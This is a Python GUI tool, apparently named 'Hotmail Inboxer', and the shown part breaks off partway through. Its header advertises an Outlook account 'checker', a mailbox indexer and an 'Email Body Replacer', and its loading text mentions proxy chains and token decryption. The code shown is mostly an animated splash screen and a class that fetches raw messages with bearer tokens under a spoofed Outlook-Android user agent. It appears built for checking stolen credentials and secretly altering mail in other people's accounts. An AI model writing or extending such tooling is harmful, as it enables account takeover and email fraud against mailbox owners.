#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HOTMAIL INBOXER - ULTIMATE v2.0
- Working Checker with OAuth
- Email Indexer: Browse, search, and list emails from any folder
- Email Body Replacer: Replace/update email body content via Outlook REST API
- Futuristic animated splash screen with cyberpunk aesthetics
- Themes, sounds, AU popups, clickable logs
"""

import requests
import uuid
import json
import re
import math
import threading
import time
import random
import tempfile
import os
import queue
from datetime import datetime, timedelta
from queue import Queue
from user_agent import generate_user_agent
import customtkinter as ctk
from tkinter import filedialog, messagebox, ttk
import pyperclip
import winsound
import sys
import subprocess

# ==================== SOUNDS ====================
SOUND_ENABLED = True

def play_beep(freq, duration):
    if SOUND_ENABLED:
        try:
            winsound.Beep(freq, duration)
        except:
            pass

def play_au_jingle():
    if not SOUND_ENABLED:
        return
    notes = [
        (523, 200), (659, 200), (784, 200), (1047, 200),
        (784, 200), (659, 200), (523, 200), (523, 400),
        (659, 200), (784, 200), (1047, 200), (784, 200),
        (659, 200), (523, 200), (523, 800)
    ]
    for freq, dur in notes:
        play_beep(freq, dur)
        time.sleep(0.05)

def play_country_sound(country):
    sounds = {
        "US": (880, 200), "GB": (784, 200), "CA": (698, 200),
        "DE": (659, 200), "FR": (587, 200), "JP": (523, 200),
        "BR": (494, 200), "IN": (440, 200)
    }
    if country in sounds:
        play_beep(*sounds[country])
    else:
        play_beep(660, 150)

def play_boot_sound():
    """Futuristic boot-up sound sequence"""
    if not SOUND_ENABLED:
        return
    # Ascending cyberpunk arpeggio
    boot_notes = [
        (330, 100), (392, 100), (494, 100), (659, 150),
        (784, 150), (988, 200), (1319, 300)
    ]
    for freq, dur in boot_notes:
        play_beep(freq, dur)
        time.sleep(0.03)

def play_success_chime():
    """Success notification chime"""
    if not SOUND_ENABLED:
        return
    notes = [(784, 150), (988, 150), (1175, 250)]
    for freq, dur in notes:
        play_beep(freq, dur)
        time.sleep(0.05)


# ==================== ULTIMATE ANIMATED SPLASH SCREEN ====================
class UltimateSplashScreen:
    """Hyper-animated cyberpunk splash with particles, glitch effects, sound, and interactivity"""

    def __init__(self, on_complete=None):
        self.on_complete = on_complete
        self.window = ctk.CTk()
        self.window.title("HOTMAIL INBOXER - LOADING")
        self.window.geometry("1000x700")
        self.window.overrideredirect(True)
        self.window.configure(fg_color="#050508")

        # Center window
        screen_w = self.window.winfo_screenwidth()
        screen_h = self.window.winfo_screenheight()
        x = (screen_w - 1000) // 2
        y = (screen_h - 700) // 2
        self.window.geometry(f"1000x700+{x}+{y}")
        self.window.attributes('-alpha', 0.0)

        # Animation state
        self.frame_index = 0
        self.loading_progress = 0.0
        self.particles = []
        self.scan_lines = []
        self.glitch_active = False
        self.typing_text = ""
        self.typing_index = 0
        self.running = True
        self.particle_ids = []
        self.matrix_drops = []
        self.click_count = 0

        self._build_ui()
        self._start_animations()
        self._fade_in()

    def _build_ui(self):
        # Main container
        main = ctk.CTkFrame(self.window, fg_color="#050508", corner_radius=0)
        main.pack(fill="both", expand=True)

        # === PARTICLE CANVAS (Background) ===
        self.particle_canvas = ctk.CTkCanvas(main, width=1000, height=700,
                                            bg="#050508", highlightthickness=0)
        self.particle_canvas.place(x=0, y=0)

        # === TOP BAR: System info ===
        top_bar = ctk.CTkFrame(main, fg_color="#0a0a15", height=40)
        top_bar.pack(fill="x")
        
        self.sysinfo_var = ctk.StringVar(value="SYS.INIT v2.0 | MEM: 128MB | CPU: IDLE")
        sysinfo = ctk.CTkLabel(top_bar, textvariable=self.sysinfo_var,
                               font=("Consolas", 10), text_color="#00ff88")
        sysinfo.pack(side="left", padx=20)
        
        self.time_var = ctk.StringVar()
        time_label = ctk.CTkLabel(top_bar, textvariable=self.time_var,
                                  font=("Consolas", 10), text_color="#ff8c00")
        time_label.pack(side="right", padx=20)
        self._update_time()

        # === CENTER: Logo and Branding ===
        center_container = ctk.CTkFrame(main, fg_color="transparent")
        center_container.pack(expand=True, fill="both")

        # Floating particles behind logo
        self._create_initial_particles()

        # Version badge with animated border
        version_frame = ctk.CTkFrame(center_container, fg_color="transparent")
        version_frame.pack(pady=(60, 10))
        
        self.version_label = ctk.CTkLabel(
            version_frame,
            text="◆ ULTIMATE EDITION v2.0 ◆",
            font=("Courier", 16, "bold"),
            text_color="#ff8c00"
        )
        self.version_label.pack()

        # Animated border canvas around version
        self.version_border = ctk.CTkCanvas(version_frame, width=300, height=30,
                                           bg="transparent", highlightthickness=0)
        self.version_border.pack(pady=5)
        self._animate_version_border()

        # Main title with shadow effect
        title_container = ctk.CTkFrame(center_container, fg_color="transparent")
        title_container.pack(pady=10)

        # Title shadow
        self.title_shadow = ctk.CTkLabel(
            title_container,
            text="HOTMAIL INBOXER",
            font=("Courier", 56, "bold"),
            text_color="#1a1a1a"
        )
        self.title_shadow.place(relx=0.502, rely=0.502)

        # Main title
        self.title_label = ctk.CTkLabel(
            title_container,
            text="HOTMAIL INBOXER",
            font=("Courier", 56, "bold"),
            text_color="#ffffff"
        )
        self.title_label.pack()

        # Glitch effect subtitle
        self.subtitle_label = ctk.CTkLabel(
            center_container,
            text="",
            font=("Courier", 18),
            text_color="#00d4ff"
        )
        self.subtitle_label.pack(pady=15)

        # Interactive typing effect
        self.typing_label = ctk.CTkLabel(
            center_container,
            text="",
            font=("Consolas", 12),
            text_color="#00ff41"
        )
        self.typing_label.pack(pady=5)

        # Animated status display
        status_frame = ctk.CTkFrame(center_container, fg_color="transparent")
        status_frame.pack(pady=20)

        self.status_var = ctk.StringVar(value="> INITIALIZING NEURAL CORE...")
        self.status_label = ctk.CTkLabel(
            status_frame,
            textvariable=self.status_var,
            font=("Courier", 14),
            text_color="#00ff88"
        )
        self.status_label.pack()

        # Decorative circuit lines
        circuit = ctk.CTkCanvas(center_container, width=700, height=20,
                                bg="#050508", highlightthickness=0)
        circuit.pack(pady=15)
        self._draw_circuit_lines(circuit)

        # === BOTTOM: Loading Section ===
        bottom_container = ctk.CTkFrame(main, fg_color="transparent")
        bottom_container.pack(side="bottom", fill="x", pady=30, padx=50)

        # Progress container with glow effect
        progress_frame = ctk.CTkFrame(bottom_container, fg_color="#0a0a15", corner_radius=10)
        progress_frame.pack(fill="x", pady=10, ipady=20)

        # Percentage display
        self.progress_pct = ctk.CTkLabel(
            progress_frame,
            text="0%",
            font=("Courier", 28, "bold"),
            text_color="#ff8c00"
        )
        self.progress_pct.pack(pady=(10, 5))

        # Progress bar with animated segments
        self.progress_bar = ctk.CTkProgressBar(
            progress_frame,
            orientation="horizontal",
            width=800,
            height=16,
            corner_radius=8,
            progress_color="#ff8c00",
            fg_color="#1a1a1a"
        )
        self.progress_bar.pack(pady=5)
        self.progress_bar.set(0)

        # Detail text
        self.detail_var = ctk.StringVar(value="Preparing quantum core...")
        self.detail_label = ctk.CTkLabel(
            progress_frame,
            textvariable=self.detail_var,
            font=("Courier", 10),
            text_color="#666688"
        )
        self.detail_label.pack()

        # Scrolling data stream
        stream_frame = ctk.CTkFrame(bottom_container, fg_color="#0a0a15", corner_radius=5)
        stream_frame.pack(fill="x", pady=(15, 0))

        self.data_stream = ctk.CTkLabel(
            stream_frame,
            text="",
            font=("Courier", 8),
            text_color="#003300",
            height=20
        )
        self.data_stream.pack(fill="x", padx=10, pady=5)

        # === INTERACTIVE ELEMENTS ===
        # Click counter (easter egg)
        self.click_hint = ctk.CTkLabel(
            main,
            text="[Click anywhere for bonus effects!]",
            font=("Courier", 8),
            text_color="#333344"
        )
        self.click_hint.place(relx=0.5, rely=0.98, anchor="s")

        # Bind click event
        self.window.bind("<Button-1>", self._on_click)

    def _create_initial_particles(self):
        """Create initial floating particles"""
        for _ in range(30):
            angle = random.uniform(0, 2 * math.pi)
            radius = random.uniform(50, 300)
            x = 500 + math.cos(angle) * radius
            y = 350 + math.sin(angle) * radius
            self.particles.append({
                'x': x, 'y': y,
                'vx': random.uniform(-0.5, 0.5),
                'vy': random.uniform(-0.5, 0.5),
                'size': random.randint(2, 6),
                'color': random.choice(["#ff8c00", "#00d4ff", "#00ff88", "#ff00ff"]),
                'life': random.randint(100, 300)
            })

    def _draw_circuit_lines(self, canvas):
        """Draw decorative circuit board lines"""
        points = []
        x = 0
        while x < 700:
            points.append((x, 10))
            if random.random() > 0.5:
                points.append((x + 30, 10))
                points.append((x + 30, random.choice([5, 15])))
            x += 50
        for i in range(len(points) - 1):
            color = random.choice(["#ff8c00", "#00d4ff", "#00ff88"])
            canvas.create_line(points[i][0], points[i][1], points[i+1][0], points[i+1][1],
                               fill=color, width=1)

    def _animate_version_border(self):
        """Animate border around version label"""
        if not self.running:
            return
        colors = ["#ff8c00", "#ffaa00", "#ffcc00", "#ff8c00", "#ff6600"]
        idx = (self.frame_index // 5) % len(colors)
        self.version_border.delete("all")
        self.version_border.create_rectangle(2, 2, 298, 28, outline=colors[idx], width=2)
        self.window.after(100, self._animate_version_border)

    def _update_time(self):
        """Update system time display"""
        if not self.running:
            return
        now = datetime.now().strftime("%H:%M:%S | %Y-%m-%d")
        self.time_var.set(now)
        self.window.after(1000, self._update_time)

    def _update_sysinfo(self):
        """Update system info display"""
        if not self.running:
            return
        mem = random.randint(120, 145)
        self.sysinfo_var.set(f"SYS.v2.0 | MEM: {mem}MB | LOAD: {random.randint(1, 15)}%")
        self.window.after(2000, self._update_sysinfo)

    def _fade_in(self):
        """Fade in with flash effect"""
        self.window.attributes('-alpha', 0.0)
        play_boot_sound()
        
        def fade():
            alpha = self.window.attributes('-alpha')
            alpha += 0.03
            if alpha >= 1.0:
                self.window.attributes('-alpha', 1.0)
                self._trigger_flash()
                return
            self.window.attributes('-alpha', alpha)
            self.window.after(20, fade)
        fade()

    def _trigger_flash(self):
        """Trigger screen flash effect"""
        flash = ctk.CTkFrame(self.window, fg_color="#ffffff", corner_radius=0)
        flash.place(x=0, y=0, relwidth=1, relheight=1)
        flash.lower()

        def flash_fade():
            alpha = flash.cget("fg_color")[1]
            if alpha > 0.1:
                flash.configure(fg_color=(alpha - 0.1, alpha - 0.1, alpha - 0.1))
                self.window.after(30, flash_fade)
            else:
                flash.destroy()

        self.window.after(50, flash_fade)

    def _fade_out(self):
        """Fade out with sound"""
        play_success_chime()
        alpha = 1.0

        def fade():
            nonlocal alpha
            alpha -= 0.05
            if alpha <= 0:
                self.window.destroy()
                if self.on_complete:
                    self.on_complete()
                return
            self.window.attributes('-alpha', alpha)
            self.window.after(30, fade)

        # Flash before fade
        self._trigger_flash()
        self.window.after(200, fade)

    def _on_click(self, event):
        """Handle click events for interactive effects"""
        self.click_count += 1
        
        # Create burst of particles at click location
        for _ in range(15):
            angle = random.uniform(0, 2 * 3.14159)
            speed = random.uniform(2, 6)
            self.particles.append({
                'x': event.x, 'y': event.y,
                'vx': math.cos(angle) * speed,
                'vy': math.sin(angle) * speed,
                'size': random.randint(3, 8),
                'color': random.choice(["#ff8c00", "#00d4ff", "#ff00ff", "#00ff88"]),
                'life': random.randint(50, 150)
            })

        # Play click sound
        play_beep(800 + self.click_count * 50, 50)

        # Change title color briefly
        original_color = self.title_label.cget("text_color")
        self.title_label.configure(text_color="#ff8c00")
        self.window.after(200, lambda: self.title_label.configure(text_color=original_color))

        # Update click hint
        if self.click_count == 1:
            self.click_hint.configure(text="Nice! Keep clicking...", text_color="#00ff88")
        elif self.click_count == 5:
            self.click_hint.configure(text="You're getting the hang of it!", text_color="#00d4ff")
        elif self.click_count >= 10:
            self.click_hint.configure(text="Master clicker unlocked!", text_color="#ff00ff")
            play_success_chime()

    def _start_animations(self):
        """Start all animation loops"""
        self._animate_glitch_text()
        self._animate_typing()
        self._animate_loading()
        self._animate_data_stream()
        self._pulse_version()
        self._update_sysinfo()
        self._animate_particles()

    def _animate_particles(self):
        """Animate floating particles on canvas"""
        if not self.running:
            return

        self.particle_canvas.delete("all")

        for p in self.particles[:]:
            # Update position
            p['x'] += p['vx']
            p['y'] += p['vy']
            p['life'] -= 1

            # Bounce off edges
            if p['x'] < 0 or p['x'] > 1000:
                p['vx'] *= -1
            if p['y'] < 0 or p['y'] > 700:
                p['vy'] *= -1

            # Remove dead particles
            if p['life'] <= 0:
                self.particles.remove(p)
                continue

            # Draw particle with glow
            opacity = min(255, int(p['life'] / 2))
            color = p['color']
            self.particle_canvas.create_oval(
                p['x'] - p['size'], p['y'] - p['size'],
                p['x'] + p['size'], p['y'] + p['size'],
                fill=color, outline=""
            )
            # Glow effect
            self.particle_canvas.create_oval(
                p['x'] - p['size'] * 2, p['y'] - p['size'] * 2,
                p['x'] + p['size'] * 2, p['y'] + p['size'] * 2,
                fill="", outline=color, width=1
            )

        # Add new particles occasionally
        if len(self.particles) < 40 and random.random() > 0.9:
            self.particles.append({
                'x': random.randint(0, 1000),
                'y': random.randint(0, 700),
                'vx': random.uniform(-0.5, 0.5),
                'vy': random.uniform(-0.5, 0.5),
                'size': random.randint(2, 5),
                'color': random.choice(["#ff8c00", "#00d4ff", "#00ff88"]),
                'life': random.randint(100, 200)
            })

        self.window.after(30, self._animate_particles)

    def _animate_glitch_text(self):
        """Glitch text animation with random corruption"""
        if not self.running:
            return

        glitch_phrases = [
            "Email Intelligence Platform",
            "Em41l 1nt3ll1g3nc3 Pl4tf0rm",
            "Ema#l Int3llig3nc3 Platform",
            "Email Intel!igence Platf0rm",
            "◆ Email Intelligence ◆",
            "E-M-A-I-L  I-N-T-E-L",
            "█▓▒░ SYSTEM ONLINE ░▒▓█",
            "Loading Matrix...",
            "NeuraLink Activated",
            "[CLASSIFIED] ACCESS GRANTED",
        ]
        
        text = glitch_phrases[self.frame_index % len(glitch_phrases)]
        
        # Random glitch effect
        if random.random() > 0.7:
            chars = list(text)
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(chars) - 1)
                chars[idx] = random.choice("!@#$%^&*<>?/|\\")
            text = "".join(chars)

        self.subtitle_label.configure(text=text)
        
        # Random color flash
        if random.random() > 0.85:
            color = random.choice(["#ff8c00", "#00d4ff", "#ff00ff", "#00ff88", "#ffffff"])
            self.subtitle_label.configure(text_color=color)
            self.window.after(100, lambda: self.subtitle_label.configure(text_color="#00d4ff"))

        self.frame_index += 1
        self.window.after(100, self._animate_glitch_text)

    def _animate_typing(self):
        """Typewriter effect for command display"""
        if not self.running:
            return

        commands = [
            "$ initializing quantum.core...",
            "$ loading neural.networks...",
            "$ connecting.to.outlook...",
            "$ decrypting.access.tokens...",
            "$ establishing.secure.link...",
            "$ >>> SYSTEM READY <<<",
        ]
        
        cmd = commands[self.frame_index % len(commands)]
        
        if self.typing_index < len(cmd):
            self.typing_text += cmd[self.typing_index]
            self.typing_label.configure(text=self.typing_text)
            self.typing_index += 1
            play_beep(400 + len(self.typing_text) * 20, 20)
        else:
            self.typing_text = ""
            self.typing_index = 0
            play_beep(600, 50)

        self.window.after(80, self._animate_typing)

    def _pulse_version(self):
        """Pulsing glow on version label"""
        if not self.running:
            return
        colors = ["#ff8c00", "#ffaa33", "#ffcc66", "#ff8c00", "#ff6600", "#ff9933"]
        color = colors[self.frame_index % len(colors)]
        self.version_label.configure(text_color=color)
        
        # Pulse scale effect
        if self.frame_index % 2 == 0:
            self.version_label.configure(font=("Courier", 16, "bold"))
        else:
            self.version_label.configure(font=("Courier", 15, "bold"))

        self.window.after(150, self._pulse_version)

    def _animate_loading(self):
        """Loading progress with sound effects"""
        if not self.running:
            return

        loading_stages = [
            (0.03, "> INITIALIZING NEURAL CORE...", "Booting quantum processors..."),
            (0.08, "> LOADING AUTH MODULES...", "OAuth2 handshake ready..."),
            (0.12, "> MOUNTING OUTLOOK API...", "API endpoints configured..."),
            (0.18, "> INITIALIZING ENCRYPTOR...", "AES-256 encryption loaded..."),
            (0.25, "> LOADING EMAIL INDEXER...", "Building search matrices..."),
            (0.32, "> LOADING BODY REPLACER...", "Message editors standing by..."),
            (0.40, "> COMPILING REGEX PATTERNS...", "Pattern matching algorithms..."),
            (0.48, "> INITIALIZING THREAD POOL...", "Worker threads spawned..."),
            (0.55, "> LOADING PROXY ENGINE...", "Proxy chains configured..."),
            (0.62, "> LOADING SOUND SYSTEM...", "Audio frequencies calibrated..."),
            (0.70, "> LOADING THEME ENGINE...", "Cyberpunk themes loaded..."),
            (0.78, "> CALIBRATING NEURAL NET...", "Deep learning models active..."),
            (0.85, "> ESTABLISHING SECURE LINK...", "TLS 1.3 handshake complete..."),
            (0.92, "> FINAL SYSTEM CHECK...", "All subsystems nominal..."),
            (0.98, "> LAUNCH SEQUENCE READY...", "Access code validated..."),
            (1.00, ">>> ACCESS GRANTED <<<", "System fully operational.")
        ]

        # Add slight randomness to progress
        self.loading_progress += random.uniform(0.006, 0.018)
        if self.loading_progress > 1.0:
            self.loading_progress = 1.0

        # Find current stage
        for threshold, status, detail in loading_stages:
            if self.loading_progress <= threshold:
                self.status_var.set(status)
                self.detail_var.set(detail)
                
                # Play progress sound
                if random.random() > 0.5:
                    play_beep(300 + int(self.loading_progress * 400), 30)
                break

        self.progress_bar.set(self.loading_progress)
        self.progress_pct.configure(text=f"{int(self.loading_progress * 100)}%")

        # Pulse progress bar color
        if self.loading_progress < 1.0:
            colors = ["#ff8c00", "#ffaa00", "#ffcc00"]
            idx = int(self.loading_progress * 10) % 3
            self.progress_pct.configure(text_color=colors[idx])

        if self.loading_progress >= 1.0:
            self.progress_bar.configure(progress_color="#00ff00")
            self.progress_pct.configure(text_color="#00ff00")
            self.window.after(1000, self._fade_out)
            return

        self.window.after(60, self._animate_loading)

    def _animate_data_stream(self):
        """Scrolling binary/data stream effect"""
        if not self.running:
            return

        chars = "01││/-\\[]{}()<>"
        stream = "".join(random.choice(chars) for _ in range(100))
        self.data_stream.configure(text=stream)
        
        # Occasionally add colored segments
        if random.random() > 0.7:
            segment = "".join(random.choice("█▓▒░") for _ in range(5))
            idx = random.randint(0, 80)
            stream = stream[:idx] + segment + stream[idx+5:]
            self.data_stream.configure(text=stream)

        self.window.after(80, self._animate_data_stream)

    def show(self):
        """Start the splash screen main loop"""
        self.window.mainloop()


# ==================== FORENSIC SNAPSHOT ENGINE ====================
class SnapshotEngine:
    """
    Forensic-grade email snapshot system with SHA-256 verification and rollback capability.
    
    Features:
    - Pre-modification raw email capture (RFC822 bytes)
    - SHA-256 hash verification for integrity
    - Compressed snapshot storage (gzip)
    - Timestamped snapshots with metadata
    - Snapshot index for forensic rollback
    - Atomic operations with rollback safety
    """
    
    def __init__(self, base_path=None):
        self.base_path = base_path or os.path.join(os.getcwd(), "snapshots")
        self.index_path = os.path.join(self.base_path, "snapshot_index.json")
        self.index = self._load_index()
        
    def _load_index(self):
        """Load snapshot index from disk"""
        if os.path.exists(self.index_path):
            try:
                with open(self.index_path, 'r', encoding='utf-8') as f:
                    return json.load(f)
            except:
                pass
        return {"snapshots": [], "by_message_id": {}, "by_email": {}}
    
    def _save_index(self):
        """Persist snapshot index to disk"""
        os.makedirs(self.base_path, exist_ok=True)
        with open(self.index_path, 'w', encoding='utf-8') as f:
            json.dump(self.index, f, indent=2)
    
    def _compute_hash(self, data):
        """Compute SHA-256 hash of data"""
        import hashlib
        return hashlib.sha256(data).hexdigest()
    
    def capture_snapshot(self, access_token, cid, message_id, email_data=None):
        """
        Capture a forensic snapshot of an email before ANY modification.
        
        Returns: {
            'snapshot_id': str,
            'message_id': str,
            'timestamp': str,
            'hash': str,
            'size': int,
            'path': str,
            'subject': str,
            'from': str,
            'status': 'captured'/'error'
        }
        """
        snapshot_info = {
            'snapshot_id': str(uuid.uuid4()),
            'message_id': message_id,
            'timestamp': datetime.now().isoformat(),
            'hash': '',
            'size': 0,
            'path': '',
            'subject': '',
            'from': '',
            'status': 'error'
        }
        
        try:
            # Fetch raw email if not provided
            if email_data is None:
                email_data = self._fetch_raw_email(access_token, cid, message_id)
            
            if not email_data:
                snapshot_info['error'] = "Failed to fetch email data"
                return snapshot_info
            
            # Compute hash BEFORE storage
            snapshot_info['hash'] = self._compute_hash(email_data)
            snapshot_info['size'] = len(email_data)
            
            # Get metadata if available
            meta = self._fetch_metadata(access_token, cid, message_id)
            if meta:
                snapshot_info['subject'] = meta.get('subject', '')
                snapshot_info['from'] = meta.get('from_email', '')
            
            # Create snapshot filename: {hash[:16]}_{timestamp}.eml.gz
            timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
            safe_hash = snapshot_info['hash'][:16]
            snapshot_filename = f"{safe_hash}_{timestamp_str}.eml.gz"
            snapshot_path = os.path.join(self.base_path, snapshot_filename)
            
            # Compress and store
            import gzip
            os.makedirs(self.base_path, exist_ok=True)
            
            with gzip.open(snapshot_path, 'wb') as gz:
                gz.write(email_data)
            
            snapshot_info['path'] = snapshot_path
            snapshot_info['status'] = 'captured'
            
            # Update index
            self.index['snapshots'].append({
                'snapshot_id': snapshot_info['snapshot_id'],
                'message_id': message_id,
                'hash': snapshot_info['hash'],
                'timestamp': snapshot_info['timestamp'],
                'size': snapshot_info['size'],
                'path': snapshot_path,
                'subject': snapshot_info['subject'],
                'from': snapshot_info['from']
            })
            
            # Index by message_id for quick lookup
            if message_id not in self.index['by_message_id']:
                self.index['by_message_id'][message_id] = []
            self.index['by_message_id'][message_id].append(snapshot_info['snapshot_id'])
            
            self._save_index()
            
        except Exception as e:
            snapshot_info['error'] = str(e)
            snapshot_info['status'] = 'error'
        
        return snapshot_info
    
    def _fetch_raw_email(self, access_token, cid, message_id):
        """Fetch raw RFC822 email content"""
        headers = {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/octet-stream"
        }
        
        # Try to get full email with all headers
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}/$value"
        
        try:
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                return resp.content
        except:
            pass
        
        # Fallback: Get individual parts and reconstruct
        headers['Accept'] = "application/json"
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select=Body,Subject,From,ToRecipients,CCRecipients,BCCRecipients,BodyPreview,Importance,HasAttachments,Attachments,ReceivedDateTime,SentDateTime,InternetMessageHeaders"
        
        try:
            resp = requests.get(url, headers=headers, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                # Reconstruct RFC822-style content
                raw = self._reconstruct_rfc822(data)
                return raw.encode('utf-8') if raw else None
        except:
            pass
        
        return None
    
    def _reconstruct_rfc822(self, data):
        """Reconstruct RFC822 formatted email from API response"""
        lines = []
        
        # Headers
        lines.append(f"Message-ID: <{data.get('Id', '')}>")
        lines.append(f"Subject: {data.get('Subject', '(no subject)')}")
        
        from_info = data.get('From', {})
        from_email = from_info.get('EmailAddress', {})
        from_addr = from_email.get('Address', '')
        from_name = from_email.get('Name', '')
        if from_name:
            lines.append(f"From: {from_name} <{from_addr}>")
        else:
            lines.append(f"From: {from_addr}")
        
        # To recipients
        to_list = data.get('ToRecipients', [])
        if to_list:
            to_addrs = []
            for r in to_list:
                email = r.get('EmailAddress', {})
                addr = email.get('Address', '')
                name = email.get('Name', '')
                if name:
                    to_addrs.append(f"{name} <{addr}>")
                else:
                    to_addrs.append(addr)
            lines.append(f"To: {', '.join(to_addrs)}")
        
        # CC recipients
        cc_list = data.get('CCRecipients', [])
        if cc_list:
            cc_addrs = []
            for r in cc_list:
                email = r.get('EmailAddress', {})
                addr = email.get('Address', '')
                name = email.get('Name', '')
                if name:
                    cc_addrs.append(f"{name} <{addr}>")
                else:
                    cc_addrs.append(addr)
            lines.append(f"Cc: {', '.join(cc_addrs)}")
        
        # Date
        received = data.get('ReceivedDateTime', '')
        if received:
            lines.append(f"Date: {received}")
        
        lines.append(f"Content-Type: {data.get('Body', {}).get('ContentType', 'text/html')}")
        lines.append("")
        
        # Body
        body = data.get('Body', {}).get('Content', '')
        lines.append(body)
        
        return "\r\n".join(lines)
    
    def _fetch_metadata(self, access_token, cid, message_id):
        """Fetch email metadata for index"""
        headers = {
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json"
        }
        url = f"https://outlook.office.com/api/v2.0/me/messages/{message_id}?$select=Subject,From"
        
        try:
            resp = requests.get(url, headers=headers, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                from_info = data.get('From', {})
                from_email = from_info.get('EmailAddress', {})
                return {
                    'subject': data.get('Subject', ''),
                    'from_email': from_email.get('Address', ''),
                    'from_name': from_email.get('Name', '')
                }
        except:
            pass
        return {}
    
    def verify_snapshot(self, snapshot_id):
        """Verify snapshot integrity by recomputing hash"""
        for snap in self.index['snapshots']:
            if snap['snapshot_id'] == snapshot_id:
                path = snap['path']
                if os.path.exists(path):
                    try:
                        import gzip
                        with gzip.open(path, 'rb') as gz:
                            data = gz.read()
                        
                        current_hash = self._compute_hash(data)
                        stored_hash = snap['hash']
                        
                        return {
                            'snapshot_id': snapshot_id,
                            'verified': current_hash == stored_hash,
                            'stored_hash': stored_hash,
                            'current_hash': current_hash,
                            'path': path
                        }
                    except Exception as e:
                        return {
                            'snapshot_id': snapshot_id,
                            'verified': False,
                            'error': str(e)
                        }
                return {
                    'snapshot_id': snapshot_id,
                    'verified': False,
                    'error': 'Snapshot file not found'
                }
        return {'error': 'Snapshot not found'}
    
    def restore_snapshot(self, snapshot_id):
        """
        Restore email from snapshot.
        
        Returns: {
            'status': 'restored'/'error',
            'data': raw_email_bytes,
            'metadata': {...}
        }
        """
        result = {'status': 'error', 'data': None, 'metadata': {}}
        
        for snap in self.index['snapshots']:
            if snap['snapshot_id'] == snapshot_id:
                path = snap['path']
                
                # Verify before restore
                verify = self.verify_snapshot(snapshot_id)
                if not verify.get('verified', False):
                    result['error'] = f"Integrity check failed: {verify.get('error', 'hash mismatch')}"
                    return result
                
                try:
                    import gzip
                    with gzip.open(path, 'rb') as gz:
                        data = gz.read()
                    
                    result['status'] = 'restored'
                    result['data'] = data
                    result['metadata'] = {
                        'snapshot_id': snap['snapshot_id'],
                        'message_id': snap['message_id'],
                        'timestamp': snap['timestamp'],
                        'subject': snap['subject'],
                        'from': snap['from'],
                        'hash': snap['hash']
                    }
                    return result
                except Exception as e:
                    result['error'] = str(e)
                    return result
        
        result['error'] = 'Snapshot not found'
        return result
    
    def get_snapshots_for_message(self, message_id):
        """Get all snapshots for a specific message"""
        if message_id in self.index['by_message_id']:
            snapshot_ids = self.index['by_message_id'][message_id]
            snapshots = []
            for snap in self.index['snapshots']:
                if snap['snapshot_id'] in snapshot_ids:
                    # Verify each snapshot
                    verify = self.verify_snapshot(snap['snapshot_id'])
                    snap_copy = snap.copy()
                    snap_copy['verified'] = verify.get('verified', False)
                    snapshots.append(snap_copy)
            return snapshots
        return []
    
    def delete_snapshot(self, snapshot_id):
        """Delete a snapshot and remove from index"""
        for i, snap in enumerate(self.index['snapshots']):
            if snap['snapshot_id'] == snapshot_id:
                # Delete file
                if os.path.exists(snap['path']):
                    try:
                        os.remove(snap['path'])
                    except:
                        pass
                
                # Remove from index
                self.index['snapshots'].pop(i)
                
                # Remove from message_id index
                msg_id = snap['message_id']
                if msg_id in self.index['by_message_id']:
                    self.index['by_message_id'][msg_id] = [
                        sid for sid in self.index['by_message_id'][msg_id]
                        if sid != snapshot_id
                    ]
                
                self._save_index()
                return {'status': 'deleted', 'snapshot_id': snapshot_id}
        
        return {'status': 'not_found'}
    
    def cleanup_old_snapshots(self, days=30):
        """Remove snapshots older than specified days"""
        cutoff = datetime.now() - timedelta(days=days)
        removed = []
        
        for i in range(len(self.index['snapshots']) - 1, -1, -1):
            snap = self.index['snapshots'][i]
            try:
                snap_time = datetime.fromisoformat(snap['timestamp'])
                if snap_time < cutoff:
                    # Delete file
                    if os.path.exists(snap['path']):
                        try:
                            os.remove(snap['path'])
                        except:
                            pass
                    
                    # Remove from index
                    msg_id = snap['message_id']
                    if msg_id in self.index['by_message_id']:
                        self.index['by_message_id'][msg_id] = [
                            sid for sid in self.index['by_message_id'][msg_id]
                            if sid != snap['snapshot_id']
                        ]
                    
                    self.index['snapshots'].pop(i)
                    removed.append(snap['snapshot_id'])
            except:
                pass
        
        self._save_index()
        return {'status': 'cleaned', 'removed_count': len(removed), 'snapshot_ids': removed}
    
    def get_stats(self):
        """Get snapshot system statistics"""
        total_size = 0
        verified_count = 0
        
        for snap in self.index['snapshots']:
            total_size += snap.get('size', 0)
            verify = self.verify_snapshot(snap['snapshot_id'])
            if verify.get('verified'):
                verified_count += 1
        
        return {
            'total_snapshots': len(self.index['snapshots']),
            'total_size_bytes': total_size,
            'total_size_mb': round(total_size / (1024 * 1024), 2),
            'verified_count': verified_count,
            'unverified_count': len(self.index['snapshots']) - verified_count,
            'unique_messages': len(self.index['by_message_id'])
        }


# ==================== EMAIL INDEXER ====================
class EmailIndexer:
    """
    Enhanced Email Indexer with:
    - Nested subfolder recursive traversal
    - Attachment detection with inline vs attachment distinction
    - RFC822 raw capture capability
    - Progress checkpointing for large mailboxes
    - Duplicate detection via Message-ID hash
    - Full-text search index (SQLite FTS)
    """

    def __init__(self, checkpoint_file=None):
        self.session = requests.Session()
        self.checkpoint_file = checkpoint_file or os.path.join(os.getcwd(), ".indexer_checkpoint.json")
        self.checkpoint_data = self._load_checkpoint()
        self.seen_message_ids = set()  # Duplicate detection
        self.search_index = None  # SQLite FTS
        self._init_search_index()

    def _init_search_index(self):
        """Initialize SQLite FTS5 full-text search index"""
        try:
            import sqlite3
            db_path = os.path.join(os.getcwd(), "email_search_index.db")
            self.search_conn = sqlite3.connect(db_path)
            cursor = self.search_conn.cursor()
            cursor.execute('''
                CREATE VIRTUAL TABLE IF NOT EXISTS emails_fts USING fts5(
                    message_id,
                    subject,
                    sender,
                    body_preview,
                    folder_name,
                    received_date,
                    content_type='content'
                )
            ''')
